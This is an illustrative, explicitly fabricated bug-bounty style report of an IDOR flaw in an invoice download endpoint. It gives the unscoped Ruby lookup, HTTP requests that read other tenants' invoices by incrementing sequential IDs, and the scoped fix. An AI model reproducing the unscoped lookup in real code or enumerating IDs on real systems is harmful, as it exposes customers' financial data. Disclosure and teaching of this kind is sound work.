# IDOR in invoice download: any authenticated user can read another tenant's invoices by changing the invoice ID

> EXAMPLE / DUMMY FINDING — illustrative only. Target, IDs, and code are fabricated.

## Summary
The invoice download endpoint loads an invoice by its primary-key ID and streams the PDF, but
never checks that the invoice belongs to the requesting user's account. Any authenticated user
can enumerate `invoice_id` and download invoices belonging to other customers.
**Root cause:** `InvoicesController#download` fetches `Invoice.find(params[:id])` with no
ownership/authorization check.

## Severity
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = **6.5 (Medium)**
PR:L (any logged-in user); C:H (full read of other tenants' financial PDFs); read-only → I:N.

## Affected / tested versions
- Affected: `app v3.x – v4.2.0`   Fixed in: `v4.2.1`   Tested build: `v4.2.0`

## Roles involved
- **Attacker:** any authenticated basic user; entitled only to their own account's invoices.
- **Victim / policy bypassed:** every other customer, whose invoices are tenant-private.

## Preconditions
- A normal user account (self-signup is enough).
- Knowledge of (or ability to enumerate) another invoice's numeric ID — they are sequential.

## Mechanism (code-level root cause)
1. **Entry point** — `app/controllers/invoices_controller.rb:42` — `before_action
   :authenticate_user!` only (authentication, not authorization).
2. **Action / sink** — `app/controllers/invoices_controller.rb:51`:
```ruby
# app/controllers/invoices_controller.rb:51
def download
  invoice = Invoice.find(params[:id])     # <-- no scope to current_user / current account
  send_data invoice.render_pdf, type: 'application/pdf'
end
```
**Proof of intent (sibling control):** the HTML view path scopes correctly, proving the
download path simply forgot it:
```ruby
# app/controllers/invoices_controller.rb:30  — the list/show path is scoped
current_user.account.invoices.find(params[:id])
```

## Steps to Reproduce
Replace `<host>`, `<token>`, `<id>`.

### Part A — setup (one-time, legitimate)
**Step 1.** Sign up / log in as a normal user. Note your own invoice ID from
`GET /invoices` (say `1041`).

### Part B — exploit
**Step 2 (control — your own invoice downloads, as expected).**
```http
GET /invoices/1041/download HTTP/1.1
Host: <host>
Authorization: Bearer <token>
```
```http
HTTP/1.1 200 OK
Content-Type: application/pdf
```

**Step 3 (bug — another tenant's invoice downloads too).**
```http
GET /invoices/1042/download HTTP/1.1
Host: <host>
Authorization: Bearer <token>
```
```http
HTTP/1.1 200 OK
Content-Type: application/pdf      # invoice 1042 belongs to a different account
```
> `[SCREENSHOT HERE: 200 + a PDF whose billing name is not the attacker's]`

## Observed (live)
On `v4.2.0` at `example.com`, user `alice` (account 7) requested
`GET /invoices/1042/download` and received **200** with a PDF addressed to `Globex Inc`
(account 12). Sequential IDs `1042`–`1060` all returned other accounts' PDFs.

## Impact
Any authenticated user reads every other customer's invoices (names, addresses, line items,
amounts) by incrementing the ID. Bulk financial-data disclosure across all tenants.

## Suggested Fix
Scope the lookup to the caller's account, exactly like the sibling list path:
```ruby
# app/controllers/invoices_controller.rb:51
invoice = current_user.account.invoices.find(params[:id])   # 404s on cross-tenant IDs
```

## References
CWE-639 (Authorization Bypass Through User-Controlled Key). OWASP API1:2023 (BOLA).
